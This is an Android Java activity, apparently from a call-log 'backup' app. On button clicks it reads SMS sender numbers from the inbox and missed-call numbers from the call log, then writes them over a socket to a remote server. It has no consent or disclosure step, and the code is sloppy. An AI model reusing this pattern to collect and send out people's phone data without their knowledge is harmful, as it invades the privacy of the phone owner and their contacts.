package com.backup.callloggenerator;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Date;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class CallLogs extends Activity implements OnClickListener {
	//TextView call;
	private Button missedCallLog;
	private Button messageLog;
	private DataOutputStream dataoutputstream;
	private DataInputStream datainputstream;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.logfile);
		Log.d("here","hear");
		//call = (TextView)findViewById(R.id.call);
		missedCallLog = (Button)findViewById(R.id.missedcall);
		messageLog = (Button)findViewById(R.id.messageLog);
		missedCallLog.setOnClickListener(this);
		messageLog.setOnClickListener(this);
		//getCallDetails();
	}
	
	

	@Override
	public void onClick(View v) {
		// TODO Auto-generated method stub
		switch (v.getId()) {
		case R.id.missedcall:
			getCallDetails();
			break;
		case R.id.messageLog:
			getMessageDetails();
			break;
		default:
			break;
		}
	}
	
	
	private void getMessageDetails() {
		StringBuffer sb = new StringBuffer();
		Uri myMessage = Uri.parse("content://sms/inbox");
        ContentResolver cr = this.getContentResolver();
        Cursor c = cr.query(myMessage, null, null, null, null);
        int readMessagesCount = c.getCount();
        Toast.makeText(getApplicationContext(),
        	    "Read massage info"+readMessagesCount, 2000).show();
        if(c.moveToFirst()){
        String name = c.getColumnName(0);
        String abc = c.getColumnName(1);
        String address = c.getColumnName(2);
        String xyz = c.getColumnName(3);
        String phoneNo = c.getString(c.getColumnIndex(address));
        int number=0;
		sb.append(""+phoneNo);
		 SendMessageToServer(sb.toString());
		 c.close();
        }
        else{
        	Toast.makeText(this, "No records Present", Toast.LENGTH_SHORT).show();
        }
	}



	private void getCallDetails() {

		StringBuffer sb = new StringBuffer();
		String[] strFields = { android.provider.CallLog.Calls.TYPE, android.provider.CallLog.Calls.NUMBER,};
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
		Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,strFields, null, null, strOrder);
		int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER ); 
		int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
		//int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
		//int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
		//sb.append( "Last missed call details : ");
		while ( managedCursor.moveToNext() ) {
		String phNumber = managedCursor.getString( number );
		String callType = managedCursor.getString( type );
		//String callDate = managedCursor.getString( date );
		//Date callDayTime = new Date(Long.valueOf(callDate));
		//String callDuration = managedCursor.getString( duration );
		String dir = null;
		int dircode = Integer.parseInt( callType );
		switch( dircode ) {
		case CallLog.Calls.OUTGOING_TYPE:
		dir = "OUTGOING";
		break;

		case CallLog.Calls.INCOMING_TYPE:
		dir = "INCOMING";
		break;

		case CallLog.Calls.MISSED_TYPE:
		dir = "MISSED";
		//sb.append( "\nCall Type:--- "+dir+ "\nPhone Number:--- "+phNumber  );
		break;
		}
		
		if(dircode == CallLog.Calls.MISSED_TYPE){
			if(sb.length()>0){
				
			sb.replace(0, sb.length(), "Call Type: "+dir+ "-Phone Number: "+phNumber  );
			//sb.append( "Call Type: "+dir+ "-Phone Number: "+phNumber  );
			//sb.append("\n----------------------------------");
			
			}else{
				sb.append( "Call Type: "+dir+ "-Phone Number: "+phNumber  );
				break;
			}
		}
		//sb.append( "\nCall Type:--- "+dir+ "\nPhone Number:--- "+phNumber  );
		//sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration );
		
		}
		managedCursor.close();
		
		 SendMessageToServer(sb.toString());
		Toast.makeText(this, sb ,Toast.LENGTH_SHORT).show();
		
	}

	
private void SendMessageToServer(String Message)
{
	try {
		if(dataoutputstream !=null){
		dataoutputstream.writeBytes(Message+"\r\n");	
		}else{
			dataoutputstream=SocketInformation.getInstance().getDataoutputstream();
			dataoutputstream.writeBytes(Message+"\r\n");
		}
		
	}catch(IOException _IoExc) {
		//QuitConnection(QUIT_TYPE_DEFAULT);
	}			
}
}
